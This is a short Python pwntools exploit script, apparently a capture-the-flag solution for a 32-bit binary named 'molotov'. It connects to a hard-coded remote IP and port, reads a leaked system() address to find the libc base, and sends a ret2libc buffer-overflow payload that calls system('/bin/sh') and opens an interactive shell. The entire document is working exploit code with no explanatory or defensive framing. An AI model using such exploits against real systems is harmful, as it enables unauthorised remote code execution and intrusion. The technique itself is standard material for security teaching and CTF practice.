#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./molotov')
context.log_level = 'INFO'
context.log_file = 'log.log'

'''
# local libc
libc = binary.libc
p = process(binary.path)
'''
# task libc
libid = 'libc6_2.30-0ubuntu2_i386'
libpath = os.getcwd() + '/libc-database/libs/' + libid + '/'
ld = ELF(libpath + 'ld-2.30.so')
libc = ELF(libpath + 'libc-2.30.so')
#p = process([ld.path, binary.path], env={'LD_LIBRARY_PATH': libpath})
p = remote('54.210.217.206', 1240)
#'''

_ = p.recvline()
system = int(_,16)
log.info('system: ' + hex(system))
libc.address = system - libc.sym.system
log.info('baselibc: ' + hex(libc.address))

payload  = 0x20 * b'A'
payload += p32(libc.sym.system)
payload += 4 * b'B'
payload += p32(libc.search(b'/bin/sh').__next__())

p.sendlineafter('Input : \n',payload)
p.interactive()
